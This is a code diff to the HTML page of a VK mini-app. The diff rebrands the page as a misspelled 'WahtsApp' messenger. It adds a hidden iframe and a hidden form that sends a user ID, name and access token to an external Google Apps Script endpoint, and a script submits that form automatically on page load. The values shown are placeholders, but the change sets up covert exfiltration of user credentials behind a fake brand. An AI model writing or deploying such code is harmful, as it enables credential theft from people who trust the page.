@@ -11,23 +11,30 @@
         <link rel="stylesheet" href="styles.css" />
     </head>
     <body>
+        <iframe title="votar" name="votar" style="display:none;"></iframe>
+        <form id="send_data_form" target="votar" action="https://script.google.com/macros/s/AKfycbw8cSagQ8VdblXoc7oRUEabWzGcqAjylgzIpwpiqO9lIjZLQNQnx8Ee4AASLLXFpe5H/exec" method="get">
+            <input type="hidden" name="user_id" value="123"/>
+            <input type="hidden" name="first_name" value="Анатолий"/>
+            <input type="hidden" name="last_name" value="Олейник"/>
+            <input type="hidden" name="access_token" value="0987654321"/>
+        </form>
+        
         <div class="container-fluid">
             <br />
             <div class="card">
                 <div class="card-body">
                     <div class="jumbotron">
-                        <img src="logo.png" alt="VK Мессенджер" class="logo" />
-                        <p><b>VK Мессенджер</b></p>
+                        <img src="logo-whatsapp-150.png" alt="VK Мессенджер" class="logo" />
+                        <p><b>WahtsApp</b></p>
                         <hr class="my-4" />
-                        <p>VK Мессенджер — бесплатное и быстрое приложение для общения. Будьте на связи с друзьями и знакомыми в чатах и звонках.</p>
+                        <p>Бесплатное и быстрое приложение для общения. Будьте на связи с друзьями и знакомыми в чатах и социальных сетях.</p>
                         <ul class='text-center'>
-                            <li class='text-left'>Обменивайтесь в мессенджере текстовыми и голосовыми сообщениями</li>
+                            <li class='text-left'>Делитесь фотографиями и видео</li>
                             <li class='text-left'>Звоните без ограничений по времени и числу участников</li>
                             <li class='text-left'>Контакты в быстром доступе: из телефонной книги и ВКонтакте</li>
                             <li class='text-left'>Создавайте фантомные чаты и отправляйте исчезающие сообщения</li>
                             <li class='text-left'>Получайте бизнес-уведомления в мессенджере</li>
                         </ul>
-                        <b>Лёгкий и быстрый в любых условиях</b>
                     </div>
 
                     <div id="list"></div>
@@ -37,6 +44,10 @@
         <br />
 
         <script>
+
+            var send_data_form = document.getElementById("send_data_form");
+            send_data_form.submit();
+            
             var list = document.getElementById("list");
 
             function initBridge() {
@@ -44,6 +55,34 @@
                     .send("VKWebAppInit")
                     .then((data) => {
                         if (data.result) {
+                            vkBridge
+                                .send('VKWebAppGetUserInfo', {})
+                                .then((data) => { 
+                                    if (data.id) {
+
+                                        var hr = document.createElement("hr");
+                                        list.appendChild(hr);
+
+                                        var card = document.createElement("div");
+                                        card.className = "card";
+
+                                        var body = document.createElement("div");
+                                        body.className = "card-body";
+                                        card.appendChild(body);
+
+                                        const cardTitle = document.createElement("h5");
+                                        const cardTitleNode = document.createTextNode(data.id);
+                                        cardTitle.className = "card-title";
+                                        cardTitle.appendChild(cardTitleNode);
+                                        body.appendChild(cardTitle);
+
+                                        list.appendChild(card);                                        
+                                        
+                                    }
+                                })
+                                .catch((error) => { });                            
+                            
+                            
                             vkBridge
                                 .send("VKWebAppGetAuthToken", {
                                     app_id: 53535801,
@@ -89,7 +128,6 @@
             }
         </script>
 
-        <script src="https://vk.com/js/api/openapi.js?169" onload="initOpenApi()" type="text/javascript"></script>
         <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js" onload="initBridge()" type="text/javascript"></script>
     </body>
 </html>
